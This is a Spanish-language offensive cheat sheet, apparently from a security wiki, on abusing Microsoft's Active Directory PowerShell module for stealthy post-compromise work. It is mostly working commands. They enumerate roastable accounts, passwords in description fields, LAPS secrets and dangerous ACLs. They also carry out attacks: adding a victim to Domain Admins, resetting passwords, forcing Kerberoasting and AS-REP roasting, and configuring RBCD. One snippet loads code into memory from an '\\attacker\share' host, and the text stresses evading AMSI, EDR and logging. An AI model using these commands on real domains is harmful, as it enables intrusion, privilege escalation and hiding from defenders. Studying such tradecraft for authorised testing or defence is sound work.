---
title: "Active Directory PowerShell Module Cheat Sheet"
category: "AD"
description: "Uso del módulo oficial de Microsoft para enumeración sigilosa (Living off the Land)."
image: "/images/wiki/9.png"
---

# AD Module: Enumeración Oficial de Microsoft (LotL)

El **Módulo de Active Directory para Windows PowerShell** (`Microsoft.ActiveDirectory.Management.dll`) es la herramienta oficial de Microsoft para administrar AD. Desde la perspectiva ofensiva resulta ideal para enumeración porque:

- Está **firmado digitalmente por Microsoft**, evitando alertas de AMSI y la mayoría de reglas de EDR.
- Su uso es **esperado y legítimo** en entornos corporativos: un sysadmin ejecuta estos cmdlets a diario.
- Genera **menos telemetría** que alternativas ofensivas: opera mediante LDAP estándar, produciendo tráfico indistinguible del tráfico de gestión habitual.

Este enfoque se conoce como **Living off the Land (LotL)**: utilizar herramientas ya presentes o esperadas en el sistema para evitar detección.

[Repositorio ADModule (DLL independiente)](https://github.com/samratashok/ADModule) -- Permite importar el módulo sin necesidad de RSAT.

---

## Instalación e Importación

### Opción 1: RSAT (con privilegios de administrador local)

```powershell
# Windows 10/11
Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
# Windows Server
Install-WindowsFeature -Name "RSAT-AD-PowerShell"
# Verificar
Get-Module -ListAvailable -Name ActiveDirectory
```

### Opción 2: Importar la DLL sin RSAT

Cuando no tienes RSAT ni permisos para instalarlo (lo habitual tras un compromiso), usa la DLL del repositorio de Nikhil Mittal. Sigue firmada por Microsoft:

```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose
Get-Command -Module ActiveDirectory
```

### Opción 3: Cargar en memoria

```powershell
$bytes = [System.IO.File]::ReadAllBytes("\\attacker\share\Microsoft.ActiveDirectory.Management.dll")
[System.Reflection.Assembly]::Load($bytes)
Import-Module ActiveDirectory
```

---

## Enumeración de Dominio y Bosque

```powershell
# Dominio actual
Get-ADDomain
Get-ADDomain | Select-Object Name, DNSRoot, NetBIOSName, DomainSID, InfrastructureMaster, PDCEmulator

# SID del dominio (fundamental para Golden/Silver Ticket)
(Get-ADDomain).DomainSID.Value

# Otro dominio en el bosque
Get-ADDomain -Identity corp.empresa.local

# Controladores de Dominio
Get-ADDomainController -Filter *
Get-ADDomainController -Discover
Get-ADReplicationDomainController -Filter *
```

### Bosque (Forest)

```powershell
Get-ADForest
(Get-ADForest).Domains              # Dominios del bosque
(Get-ADForest).GlobalCatalogs       # Catálogos globales
(Get-ADForest).ForestMode           # Nivel funcional
```

### Relaciones de Confianza (Trusts)

```powershell
Get-ADTrust -Filter *
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, IntraForest, ForestTransitive
```

| Propiedad | Significado |
|-----------|-------------|
| `Direction` | Bidirectional, Inbound, Outbound |
| `TrustType` | External, Forest, ParentChild |
| `IntraForest` | `$True` si es dentro del mismo bosque |
| `ForestTransitive` | `$True` si es transitiva entre bosques |

---

## Enumeración de Usuarios

```powershell
# Todos los usuarios / usuario específico
Get-ADUser -Filter *
Get-ADUser -Identity administrador -Properties *
```

### Contraseñas en Descripciones

Es sorprendentemente común encontrar credenciales en el campo Description:

```powershell
Get-ADUser -Filter 'Description -like "*pass*"' -Properties Description |
    Select-Object SamAccountName, Name, Description
```

### Filtros Clave para Ataque

```powershell
# Cuentas deshabilitadas
Get-ADUser -Filter {Enabled -eq $False} | Select-Object SamAccountName

# Password Never Expires (probables cuentas de servicio con contraseñas antiguas)
Get-ADUser -Filter {PasswordNeverExpires -eq $True} -Properties PasswordLastSet |
    Select-Object SamAccountName, PasswordLastSet

# Último inicio de sesión (cuentas inactivas / honeypots)
Get-ADUser -Filter * -Properties LastLogonDate |
    Sort-Object LastLogonDate | Select-Object SamAccountName, LastLogonDate -First 20

# AdminCount=1 (pertenecen o pertenecieron a grupos protegidos)
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount |
    Select-Object SamAccountName
```

### Kerberoastables (SPN configurado)

Cuentas de usuario con SPN registrado: el TGS se puede solicitar y crackear offline:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, PasswordLastSet |
    Select-Object SamAccountName, ServicePrincipalName, PasswordLastSet
```

### AS-REP Roastables (Pre-Auth deshabilitada)

Cuentas sin pre-autenticación Kerberos: el AS-REP se puede crackear offline:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName, DoesNotRequirePreAuth
```

---

## Enumeración de Grupos

```powershell
# Todos los grupos / búsqueda por nombre
Get-ADGroup -Filter * | Select-Object Name, GroupScope, GroupCategory
Get-ADGroup -Filter 'Name -like "*admin*"'

# Miembros directos
Get-ADGroupMember -Identity "Domain Admins"

# Miembros recursivos (resuelve anidación)
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object SamAccountName, objectClass

# Grupos de un usuario
(Get-ADUser -Identity usuario -Properties MemberOf).MemberOf |
    ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }
```

### Grupos Privilegiados a Revisar Siempre

| Grupo | Riesgo |
|-------|--------|
| `Domain Admins` | Control total del dominio |
| `Enterprise Admins` | Control total del bosque |
| `Schema Admins` | Modificar el esquema de AD |
| `Backup Operators` | Leer cualquier fichero (incluido NTDS.dit) |
| `Account Operators` | Crear/modificar cuentas |
| `DnsAdmins` | Escalada a DA vía DLL injection |
| `Server Operators` | Administrar DCs |
| `Group Policy Creator Owners` | Crear/editar GPOs |

```powershell
# Enumerar miembros de todos los grupos privilegiados
$grupos = @("Domain Admins","Enterprise Admins","Schema Admins","Backup Operators","Account Operators","DnsAdmins","Server Operators")
foreach ($g in $grupos) {
    Write-Host "=== $g ===" -ForegroundColor Yellow
    Get-ADGroupMember -Identity $g -Recursive -ErrorAction SilentlyContinue | Select-Object SamAccountName
}
```

---

## Enumeración de Computadoras

```powershell
# Todas con sistema operativo
Get-ADComputer -Filter * -Properties OperatingSystem |
    Select-Object Name, DNSHostName, OperatingSystem

# Sistemas obsoletos (quick wins)
Get-ADComputer -Filter 'OperatingSystem -like "*Windows 7*" -or OperatingSystem -like "*2008*"' -Properties OperatingSystem |
    Select-Object Name, OperatingSystem

# Solo servidores
Get-ADComputer -Filter 'OperatingSystem -like "*Server*"' -Properties OperatingSystem
```

### Delegación Kerberos

```powershell
# Unconstrained Delegation (permite impersonar a cualquier usuario que se autentique)
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation |
    Select-Object Name, DNSHostName

# Constrained Delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo |
    Select-Object Name, msDS-AllowedToDelegateTo
```

### LAPS (si tienes permisos de lectura)

```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
    Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } |
    Select-Object Name, ms-Mcs-AdmPwd
```

---

## OUs y GPOs

```powershell
# Listar OUs
Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName

# Objetos dentro de una OU
Get-ADUser -Filter * -SearchBase "OU=Finanzas,DC=corp,DC=local"
Get-ADComputer -Filter * -SearchBase "OU=Servers,DC=corp,DC=local"

# GPOs (objetos en AD)
Get-ADObject -Filter 'objectClass -eq "groupPolicyContainer"' -Properties displayName, gPCFileSysPath |
    Select-Object displayName, gPCFileSysPath

# AppLocker efectivo
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

## ACLs (Access Control Lists)

Las ACLs sobre objetos de AD definen quién puede hacer qué. Su abuso es una de las vías de escalada más comunes:

```powershell
# ACL de un usuario
(Get-ACL "AD:\CN=usuario,CN=Users,DC=corp,DC=local").Access |
    Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType

# Buscar permisos peligrosos sobre un grupo privilegiado
(Get-ACL "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local").Access |
    Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|WriteOwner" -and $_.AccessControlType -eq "Allow" } |
    Select-Object IdentityReference, ActiveDirectoryRights
```

| Permiso | Impacto |
|---------|---------|
| `GenericAll` | Control total sobre el objeto |
| `GenericWrite` | Modificar atributos (e.g., SPN para Kerberoasting) |
| `WriteDacl` | Modificar las ACLs del objeto |
| `WriteOwner` | Cambiar el propietario |
| `ForceChangePassword` | Resetear contraseña sin conocer la actual |

---

## Modificación y Ataque (Requiere Permisos)

### Targeted Kerberoasting (agregar SPN)

Si tienes `GenericAll` o `GenericWrite` sobre un usuario:

```powershell
Set-ADUser -Identity victima -ServicePrincipalNames @{Add='http/ficticio.corp.local'}
# Verificar
Get-ADUser -Identity victima -Properties ServicePrincipalName | Select-Object ServicePrincipalName
# Limpiar
Set-ADUser -Identity victima -ServicePrincipalNames @{Remove='http/ficticio.corp.local'}
```

### Forzar AS-REP Roasting

```powershell
Set-ADAccountControl -Identity victima -DoesNotRequirePreAuth $True
# Revertir
Set-ADAccountControl -Identity victima -DoesNotRequirePreAuth $False
```

### Agregar a Grupo / Resetear Password

```powershell
# Agregar a grupo
Add-ADGroupMember -Identity "Domain Admins" -Members usuario_comprometido
# Revertir
Remove-ADGroupMember -Identity "Domain Admins" -Members usuario_comprometido -Confirm:$False

# Resetear contraseña
Set-ADAccountPassword -Identity victima -Reset -NewPassword (ConvertTo-SecureString "NuevaPass123!" -AsPlainText -Force)
```

### Resource-Based Constrained Delegation (RBCD)

```powershell
Set-ADComputer -Identity "SERVIDOR$" -PrincipalsAllowedToDelegateToAccount (Get-ADComputer -Identity "ATACANTE$")
```

---

## Ventajas OPSEC

| Aspecto | AD Module (LotL) | PowerView / SharpHound |
|---------|-------------------|------------------------|
| **Firma digital** | Firmado por Microsoft | Sin firmar o firmas no confiables |
| **AMSI** | No genera alertas | Detectado por mayoría de AV/EDR |
| **ScriptBlock Logging** | Cmdlets legítimos | Funciones ofensivas marcadas por reglas |
| **Tráfico de red** | LDAP estándar (389/636) | Patrones de enumeración masiva detectables |
| **Presencia en disco** | DLL de Microsoft | Scripts/binarios que alertan en escritura |

### Limitaciones

- No busca sesiones, shares abiertos ni ejecuta comandos remotos (complementar con PowerView o `Find-PSRemotingLocalAdminAccess`).
- Las consultas LDAP siguen apareciendo en logs del DC si la auditoría está bien configurada (Event ID 1644, 4662).
- No sustituye a BloodHound para visualizar caminos de ataque complejos.

---

## Entradas Relacionadas

- **PowerView** -- Alternativa ofensiva con funciones avanzadas (sesiones, shares, ACL abuse).
- **BloodHound / SharpHound** -- Visualización de caminos de ataque mediante grafos.
- **Kerberoasting** -- Ataque que aprovecha SPNs en cuentas de usuario.
- **AS-REP Roasting** -- Ataque contra cuentas sin pre-autenticación Kerberos.
- **Golden Ticket / Silver Ticket** -- Ataques de persistencia con Kerberos.
- **DCSync** -- Replicación de hashes desde el DC.
- **Resource-Based Constrained Delegation (RBCD)** -- Abuso de delegación para impersonación.
